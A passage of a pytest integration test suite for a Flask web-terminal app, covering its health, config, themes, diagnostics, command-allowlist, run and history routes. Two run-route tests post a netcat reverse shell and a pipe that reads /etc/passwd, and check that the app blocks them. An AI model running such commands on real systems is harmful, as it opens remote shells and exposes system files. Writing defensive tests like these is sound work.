"""
Integration tests for Flask routes using the test client.
These tests exercise HTTP-level behaviour without starting a real server.
Run with: pytest tests/ (from the repo root)
"""

import json
import logging
import os
import sqlite3
import uuid
from datetime import datetime, timedelta
import unittest.mock as mock

import app as shell_app
import blueprints.assets as shell_assets
import config
from database import DB_PATH


# ── Fixtures ──────────────────────────────────────────────────────────────────
# Route tests intentionally disable rate limiting so individual cases can focus
# on route behavior rather than shared per-IP quota state.

def get_client(*, use_forwarded_for=True):
    shell_app.app.config["TESTING"] = True
    shell_app.app.config["RATELIMIT_ENABLED"] = False
    client = shell_app.app.test_client()
    if use_forwarded_for:
        client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
    return client


# ── / ─────────────────────────────────────────────────────────────────────────

class TestIndexRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/")
        assert resp.status_code == 200

    def test_returns_html(self):
        client = get_client()
        resp = client.get("/")
        assert b"<!DOCTYPE html>" in resp.data or b"<html" in resp.data.lower()

    def test_desktop_diag_link_opens_in_new_tab_while_mobile_action_stays_button(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/").get_data(as_text=True)
        assert 'id="diag-btn"' in body
        assert 'href="/diag"' in body
        assert 'target="_blank"' in body
        assert 'rel="noopener noreferrer"' in body
        assert 'button data-action="diag"' in body

# ── /health ───────────────────────────────────────────────────────────────────

class TestHealthRoute:
    def test_returns_200_when_db_ok(self):
        client = get_client()
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_response_is_json(self):
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert "status" in data
        assert "db" in data
        assert "redis" in data

    def test_db_true_when_sqlite_available(self):
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert data["db"] is True

    def test_redis_null_when_no_redis(self):
        # In the test environment there is no Redis configured
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert data["redis"] is None

    def test_status_degraded_when_db_fails(self):
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            resp = client.get("/health")
        assert resp.status_code == 503
        data = json.loads(resp.data)
        assert data["status"] == "degraded"
        assert data["db"] is False

    def test_status_ok_when_redis_pings_successfully(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.return_value = True
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            resp = client.get("/health")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["status"] == "ok"
        assert data["redis"] is True

    def test_status_degraded_when_redis_ping_fails(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.side_effect = Exception("redis down")
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            resp = client.get("/health")
        assert resp.status_code == 503
        data = json.loads(resp.data)
        assert data["status"] == "degraded"
        assert data["redis"] is False


# ── /config ───────────────────────────────────────────────────────────────────

class TestConfigRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/config")
        assert resp.status_code == 200

    def test_contains_expected_keys(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("app_name", "project_readme", "prompt_prefix", "default_theme", "max_tabs", "max_output_lines"):
            assert key in data
        assert "share_redaction_enabled" in data
        assert "share_redaction_rules" in data

    def test_max_tabs_is_int(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        assert isinstance(data["max_tabs"], int)

    def test_contains_timeout_and_welcome_keys(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("command_timeout_seconds",
                    "welcome_char_ms", "welcome_jitter_ms",
                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
                    "welcome_sample_count", "welcome_status_labels",
                    "welcome_hint_interval_ms", "welcome_hint_rotations"):
            assert key in data, f"missing key: {key}"

    def test_all_new_keys_are_ints(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("command_timeout_seconds",
                    "welcome_char_ms", "welcome_jitter_ms",
                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
                    "welcome_sample_count", "welcome_hint_interval_ms",
                    "welcome_hint_rotations"):
            assert isinstance(data[key], int), f"{key} should be int, got {type(data[key])}"
        assert isinstance(data["welcome_status_labels"], list)
        assert all(isinstance(item, str) for item in data["welcome_status_labels"])

    def test_command_timeout_reflects_cfg(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"command_timeout_seconds": 300}):
            data = json.loads(client.get("/config").data)
        assert data["command_timeout_seconds"] == 300

    def test_prompt_prefix_reflects_cfg(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"prompt_prefix": "ops@darklab:~$"}):
            data = json.loads(client.get("/config").data)
        assert data["prompt_prefix"] == "ops@darklab:~$"

    def test_project_readme_is_constant(self):
        client = get_client()
        with mock.patch("config.PROJECT_README", "https://example.invalid/README.md"):
            data = json.loads(client.get("/config").data)
        assert data["project_readme"] == "https://example.invalid/README.md"

    def test_welcome_timing_reflects_cfg(self):
        client = get_client()
        overrides = {
            "welcome_char_ms": 25,
            "welcome_jitter_ms": 5,
            "welcome_post_cmd_ms": 400,
            "welcome_inter_block_ms": 1000,
            "welcome_first_prompt_idle_ms": 1800,
            "welcome_post_status_pause_ms": 300,
            "welcome_sample_count": 4,
            "welcome_status_labels": ["CONFIG", "CACHE", "READY"],
            "welcome_hint_interval_ms": 3000,
            "welcome_hint_rotations": 1,
        }
        with mock.patch.dict("config.CFG", overrides):
            data = json.loads(client.get("/config").data)
        for key, val in overrides.items():
            assert data[key] == val, f"{key}: expected {val}, got {data[key]}"

    def test_command_timeout_defaults_to_one_hour(self):
        # Default config keeps long-running commands bounded to an hour
        client = get_client()
        with mock.patch.dict("config.CFG", {"command_timeout_seconds": 3600}):
            data = json.loads(client.get("/config").data)
        assert data["command_timeout_seconds"] == 3600

    def test_diag_enabled_false_when_cidrs_empty(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_diag_enabled_false_when_client_ip_not_in_cidrs(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["10.0.0.0/8"]}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_diag_enabled_true_when_client_ip_in_cidrs(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is True

    def test_diag_enabled_uses_trusted_forwarded_for_when_present(self):
        client = get_client(use_forwarded_for=True)
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
            "trusted_proxy_cidrs": ["127.0.0.1/32"],
        }):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is True

    def test_diag_enabled_ignores_forwarded_for_from_untrusted_peer(self):
        client = get_client(use_forwarded_for=True)
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
            "trusted_proxy_cidrs": ["10.0.0.0/8"],
        }):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_share_redaction_rules_reflect_cfg(self):
        client = get_client()
        rules = [
            {"label": "bearer", "pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": "i"},
        ]
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": rules,
        }):
            data = json.loads(client.get("/config").data)
        assert data["share_redaction_enabled"] is True
        assert any(rule["label"] == "bearer token" for rule in data["share_redaction_rules"])
        assert data["share_redaction_rules"][-1] == rules[0]

    def test_share_redaction_rules_empty_when_disabled(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": False,
            "share_redaction_rules": [
                {"label": "custom", "pattern": "internal", "replacement": "[custom]"},
            ],
        }):
            data = json.loads(client.get("/config").data)
        assert data["share_redaction_enabled"] is False
        assert data["share_redaction_rules"] == []


# ── /themes ──────────────────────────────────────────────────────────────────

class TestThemesRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/themes")
        assert resp.status_code == 200

    def test_response_has_current_and_themes(self):
        client = get_client()
        data = json.loads(client.get("/themes").data)
        assert "current" in data
        assert "themes" in data
        assert isinstance(data["themes"], list)

    def test_includes_named_theme_variants(self):
        client = get_client()
        data = json.loads(client.get("/themes").data)
        themes = {theme["name"]: theme for theme in data["themes"]}
        assert "blue_paper" in themes
        assert "olive_grove" in themes
        assert "darklab_obsidian" in themes
        assert "emerald_obsidian" in themes
        assert "charcoal_steel" in themes
        assert "dark" not in themes
        assert "light" not in themes
        assert themes["blue_paper"]["label"] == "Blue Paper"
        assert themes["olive_grove"]["label"] == "Olive Grove"
        assert themes["darklab_obsidian"]["label"] == "Darklab Obsidian"
        assert themes["emerald_obsidian"]["label"] == "Emerald Obsidian"
        assert themes["charcoal_steel"]["label"] == "Charcoal Steel"
        assert themes["blue_paper"]["group"] == "Cool Light"
        assert themes["olive_grove"]["group"] == "Warm Light"
        assert themes["darklab_obsidian"]["group"] == "Dark Neon"
        assert themes["emerald_obsidian"]["group"] == "Dark Neon"
        assert themes["blue_paper"]["filename"] == "blue_paper.yaml"
        assert themes["olive_grove"]["filename"] == "olive_grove.yaml"
        assert themes["darklab_obsidian"]["filename"] == "darklab_obsidian.yaml"
        assert themes["emerald_obsidian"]["filename"] == "emerald_obsidian.yaml"

    def test_default_theme_is_exposed_as_filename(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"default_theme": "darklab_obsidian.yaml"}):
            data = json.loads(client.get("/config").data)
        assert data["default_theme"] == "darklab_obsidian.yaml"

    def test_default_theme_filename_selects_variant(self):
        client = get_client(use_forwarded_for=False)
        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "darklab_obsidian"
        assert data["current"]["filename"] == "darklab_obsidian.yaml"
        assert data["current"]["label"] == "Darklab Obsidian"
        assert data["current"]["group"] == "Dark Neon"
        assert data["current"]["sort"] == 0

    def test_pref_theme_name_cookie_selects_variant(self):
        client = get_client(use_forwarded_for=False)
        client.set_cookie("pref_theme_name", "blue_paper")
        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "blue_paper"
        assert data["current"]["label"] == "Blue Paper"
        assert data["current"]["group"] == "Cool Light"

    def test_empty_registry_falls_back_to_built_in_dark_theme(self, monkeypatch):
        client = get_client(use_forwarded_for=False)
        monkeypatch.setitem(config.CFG, "default_theme", "theme_missing.yaml")
        monkeypatch.setitem(shell_app.get_theme_entry.__globals__, "THEME_REGISTRY_MAP", {})
        monkeypatch.setitem(shell_app.get_theme_entry.__globals__, "THEME_REGISTRY", [])

        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "dark"
        assert data["current"]["source"] == "built-in"
        assert data["current"]["group"] == "Other"
        assert data["current"]["sort"] == 0
        assert data["themes"] == []


# ── /vendor assets ───────────────────────────────────────────────────────────

class TestVendorAssets:
    def test_ansi_up_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/ansi_up.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type

    def test_jspdf_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/jspdf.umd.min.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type

    def test_font_route_serves_committed_file(self, tmp_path, monkeypatch):
        client = get_client()
        font_dir = tmp_path / "fonts"
        font_dir.mkdir()
        (font_dir / "JetBrainsMono-400.ttf").write_bytes(b"font bytes")
        monkeypatch.setattr(shell_assets, "_FONT_DIR", font_dir)

        resp = client.get("/vendor/fonts/JetBrainsMono-400.ttf")
        assert resp.status_code == 200
        assert resp.data == b"font bytes"

    def test_font_route_rejects_unknown_or_traversal_paths(self):
        client = get_client()

        resp = client.get("/vendor/fonts/UnknownFont.ttf")
        assert resp.status_code == 404

        resp = client.get("/vendor/fonts/../../app.py")
        assert resp.status_code == 404


# ── /diag ─────────────────────────────────────────────────────────────────────

class TestDiagRoute:
    """Operator diagnostics endpoint — IP-gated, returns 404 when unconfigured."""

    def _allowed_client(self):
        """Test client whose remote_addr (127.0.0.1) matches the allowed CIDR."""
        shell_app.app.config["TESTING"] = True
        shell_app.app.config["RATELIMIT_ENABLED"] = False
        # No X-Forwarded-For — we want remote_addr to be 127.0.0.1 (Werkzeug default)
        return shell_app.app.test_client()

    def test_returns_404_when_cidrs_empty(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            with mock.patch.object(logging.getLogger("shell"), "warning") as mock_warn:
                resp = client.get("/diag")
        assert resp.status_code == 404
        mock_warn.assert_called_once()
        event = mock_warn.call_args[0][0]
        assert event == "DIAG_DENIED"
        assert mock_warn.call_args[1]["extra"]["ip"] == "127.0.0.1"
        assert mock_warn.call_args[1]["extra"]["allowed_cidrs"] == []

    def test_returns_404_when_cidrs_not_set(self):
        client = self._allowed_client()
        cfg_without_key = {k: v for k, v in config.CFG.items() if k != "diagnostics_allowed_cidrs"}
        with mock.patch.dict("config.CFG", cfg_without_key, clear=True):
            resp = client.get("/diag")
        assert resp.status_code == 404

    def test_returns_404_when_client_ip_not_in_cidrs(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["10.0.0.0/8"]}):
            resp = client.get("/diag")
        assert resp.status_code == 404

    def test_returns_200_when_client_ip_in_cidrs(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag")
        assert resp.status_code == 200

    def test_response_has_expected_top_level_keys(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert set(data.keys()) >= {"app", "config", "db", "redis", "assets", "tools"}

    def test_app_section_has_version_and_name(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "app_name": "test shell",
        }):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["app"]["name"] == "test shell"
        assert isinstance(data["app"]["version"], str)

    def test_config_section_contains_operational_keys(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        cfg = data["config"]
        for key in ("rate_limit_enabled", "command_timeout_seconds", "max_output_lines",
                    "persist_full_run_output", "permalink_retention_days",
                    "share_redaction_enabled", "custom_redaction_rule_count"):
            assert key in cfg, f"missing config key: {key}"

    def test_db_section_ok_and_has_counts(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["db"]["ok"] is True
        assert isinstance(data["db"]["runs"], int)
        assert isinstance(data["db"]["snapshots"], int)

    def test_db_section_error_on_db_failure(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db down")):
                data = json.loads(client.get("/diag?format=json").data)
        assert data["db"]["ok"] is False
        assert "error" in data["db"]

    def test_redis_section_reflects_client_presence(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert "configured" in data["redis"]

    def test_assets_section_reports_loaded_when_files_present(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["assets"]["ansi_up"] == "loaded"
        assert data["assets"]["jspdf"] == "loaded"
        assert data["assets"]["fonts"] == "loaded"

    def test_assets_section_reports_missing_when_files_absent(self, tmp_path, monkeypatch):
        client = self._allowed_client()
        monkeypatch.setattr(shell_assets, "_ANSI_UP_JS", tmp_path / "missing_ansi_up.js")
        monkeypatch.setattr(shell_assets, "_JSPDF_JS", tmp_path / "missing_jspdf.js")
        monkeypatch.setattr(shell_assets, "_FONT_DIR", tmp_path / "missing_fonts")
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["assets"]["ansi_up"] == "missing"
        assert data["assets"]["jspdf"] == "missing"
        assert data["assets"]["fonts"] == "missing"

    def test_tools_section_has_present_and_missing_lists(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert isinstance(data["tools"]["present"], list)
        assert isinstance(data["tools"]["missing"], list)

    def test_tools_present_contains_known_binary(self):
        """curl is allowed and installed in the dev environment."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        # At minimum, basic tools available in dev should appear in present
        present = data["tools"]["present"]
        assert isinstance(present, list)
        # Every entry in present must actually resolve via which()
        import shutil as _shutil
        for tool in present:
            assert _shutil.which(tool) is not None, f"{tool} in present but not found by which()"

    def test_honors_forwarded_for_header_from_trusted_proxy(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
            "trusted_proxy_cidrs": ["127.0.0.1/32"],
        }):
            resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
        assert resp.status_code == 200

    def test_ignores_forwarded_for_header_from_untrusted_proxy(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
            "trusted_proxy_cidrs": ["192.0.2.0/24"],
        }):
            resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
        assert resp.status_code == 404

    def test_diag_viewed_logged_on_success(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(logging.getLogger("shell"), "info") as mock_info:
                resp = client.get("/diag")
        assert resp.status_code == 200
        events = [call[0][0] for call in mock_info.call_args_list]
        assert "DIAG_VIEWED" in events
        viewed_call = next(c for c in mock_info.call_args_list if c[0][0] == "DIAG_VIEWED")
        assert viewed_call[1]["extra"]["ip"] == "127.0.0.1"

    def test_html_response_contains_expected_content(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "app_name": "diag test shell",
        }):
            resp = client.get("/diag")
        body = resp.get_data(as_text=True)
        assert "diag test shell" in body
        assert "operator diagnostics" in body
        assert 'class="term-action-btn diag-back-btn"' in body
        assert 'href="/"' in body
        assert "back to shell" in body
        assert "<!DOCTYPE html>" in body or "<html" in body.lower()

    def test_html_response_renders_zero_custom_redaction_rule_count_as_numeric_zero(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            body = client.get("/diag").get_data(as_text=True)
        assert "custom_redaction_rule_count" in body
        assert ">0<" in body

    def test_json_format_param_returns_json(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag?format=json")
        assert "application/json" in resp.content_type
        data = json.loads(resp.data)
        assert "app" in data


# ── /allowed-commands ─────────────────────────────────────────────────────────

class TestAllowedCommandsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/allowed-commands")
        assert resp.status_code == 200

    def test_response_has_restricted_key(self):
        client = get_client()
        data = json.loads(client.get("/allowed-commands").data)
        assert "restricted" in data

    def test_unrestricted_when_no_file(self):
        client = get_client()
        # Patch in app's namespace — the route calls load_allowed_commands() directly
        with mock.patch("blueprints.content.load_allowed_commands", return_value=(None, [])):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is False

    def test_restricted_when_file_present(self):
        client = get_client()
        with mock.patch("blueprints.content.load_allowed_commands", return_value=(["ping", "nmap"], [])):
            with mock.patch("blueprints.content.load_allowed_commands_grouped", return_value=[]):
                data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is True
        assert "ping" in data["commands"]

    def test_returns_grouped_commands_when_restricted(self):
        client = get_client()
        groups = [{"name": "Networking", "commands": ["ping", "traceroute"]}]
        with mock.patch("blueprints.content.load_allowed_commands", return_value=(["ping", "traceroute"], [])):
            with mock.patch("blueprints.content.load_allowed_commands_grouped", return_value=groups):
                data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is True
        assert data["groups"] == groups


# ── /faq ──────────────────────────────────────────────────────────────────────

class TestFaqRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/faq")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/faq").data)
        assert "items" in data
        assert isinstance(data["items"], list)

    def test_includes_builtin_faq_entries(self):
        client = get_client()
        data = json.loads(client.get("/faq").data)
        questions = [item.get("question") for item in data["items"]]
        assert "What is this?" in questions
        assert "What commands are allowed?" in questions


# ── /welcome/ascii ───────────────────────────────────────────────────────────

class TestWelcomeAsciiRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/ascii")
        assert resp.status_code == 200

    def test_contains_banner_art(self):
        client = get_client()
        resp = client.get("/welcome/ascii")
        assert b"/$$" in resp.data


class TestWelcomeAsciiMobileRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/ascii-mobile")
        assert resp.status_code == 200

    def test_returns_plain_text_banner(self):
        client = get_client()
        resp = client.get("/welcome/ascii-mobile")
        assert resp.mimetype == "text/plain"
        assert resp.data


# ── /welcome/hints ───────────────────────────────────────────────────────────

class TestWelcomeHintsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/hints")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/welcome/hints").data)
        assert "items" in data
        assert isinstance(data["items"], list)


class TestMobileWelcomeHintsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/hints-mobile")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/welcome/hints-mobile").data)
        assert "items" in data
        assert isinstance(data["items"], list)


# ── /run ──────────────────────────────────────────────────────────────────────

class TestRunRoute:
    def test_missing_command_returns_400(self):
        client = get_client()
        resp = client.post("/run", json={})
        assert resp.status_code == 400

    def test_empty_command_returns_400(self):
        client = get_client()
        resp = client.post("/run", json={"command": "   "})
        assert resp.status_code == 400

    def test_non_string_command_returns_400(self):
        client = get_client()
        resp = client.post("/run", json={"command": 123})
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Command must be a string"

    def test_non_object_json_returns_400(self):
        client = get_client()
        resp = client.post("/run", json=["not", "an", "object"])
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Request body must be a JSON object"

    def test_disallowed_command_returns_403(self):
        client = get_client()
        # Patch in commands' namespace — is_command_allowed calls load_allowed_commands
        # from commands' own namespace, not from app's.
        with mock.patch("commands.load_allowed_commands", return_value=(["ping"], [])):
            resp = client.post("/run", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
        assert resp.status_code == 403

    def test_shell_operator_returns_403(self):
        client = get_client()
        with mock.patch("commands.load_allowed_commands", return_value=(["ping"], [])):
            resp = client.post("/run", json={"command": "ping google.com | cat /etc/passwd"})
        assert resp.status_code == 403

    def test_missing_allowlisted_command_returns_synthetic_run(self):
        client = get_client()
        with mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
             mock.patch("blueprints.run.subprocess.Popen") as popen:
            resp = client.post("/run", json={"command": "nmap -sV darklab.sh"})
            body = resp.get_data(as_text=True)
        assert resp.status_code == 200
        assert '"type": "started"' in body
        assert "Command is not installed on this instance: nmap\\n" in body
        assert '"type": "exit"' in body
        popen.assert_not_called()

    def test_non_json_body_handled(self):
        client = get_client()
        resp = client.post("/run", data="not json", content_type="text/plain")
        # Should not crash — Flask returns 400 or 415 for bad content type
        assert resp.status_code in (400, 415, 500)


# ── /history ──────────────────────────────────────────────────────────────────

class TestHistoryRoute:
    def test_get_returns_200(self):
        client = get_client()
        resp = client.get("/history", headers={"X-Session-ID": "test-session"})
        assert resp.status_code == 200

    def test_get_returns_runs_list(self):
        client = get_client()
        data = json.loads(
            client.get("/history", headers={"X-Session-ID": "test-session"}).data
        )
        assert "runs" in data
        assert isinstance(data["runs"], list)
        assert "roots" in data
        assert isinstance(data["roots"], list)

    def test_delete_all_returns_ok(self):
        client = get_client()
        resp = client.delete("/history", headers={"X-Session-ID": "test-session"})
        assert resp.status_code == 200
        assert json.loads(resp.data)["ok"] is True

    def test_delete_specific_nonexistent_run_returns_ok(self):
        # Deleting a run_id that doesn't exist should still return ok (idempotent)
        client = get_client()
        resp = client.delete(
            "/history/nonexistent-run-id",
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        assert json.loads(resp.data)["ok"] is True

    def test_get_run_nonexistent_returns_404(self):
        client = get_client()
        resp = client.get("/history/nonexistent-run-id")
        assert resp.status_code == 404

    def test_history_respects_panel_limit_and_sorts_newest_first(self):
        client = get_client()
        session = "limit-test-session"
        run_ids = ["limit-run-1", "limit-run-2", "limit-run-3"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "echo one", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "echo two", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "echo three", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]"),
            )
            conn.commit()
            conn.close()

            with mock.patch.dict("config.CFG", {"history_panel_limit": 2}):
                resp = client.get("/history", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            commands = [r["command"] for r in data["runs"]]

            assert commands == ["echo three", "echo two"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_search_filters_by_command_text(self):
        client = get_client()
        session = "history-search-session"
        run_ids = ["search-run-1", "search-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "ping darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?q=dig", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_by_command_root(self):
        client = get_client()
        session = "history-root-session"
        run_ids = ["root-run-1", "root-run-2", "root-run-3"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sV darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]", 1),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "nmap -Pn darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]", 0),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "dig darklab.sh A", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]", 1),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?command_root=nmap", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["nmap -Pn darklab.sh", "nmap -sV darklab.sh"]
            assert data["roots"] == ["dig", "nmap"]
        finally:
            conn = sqlite3.connect(DB_PATH)
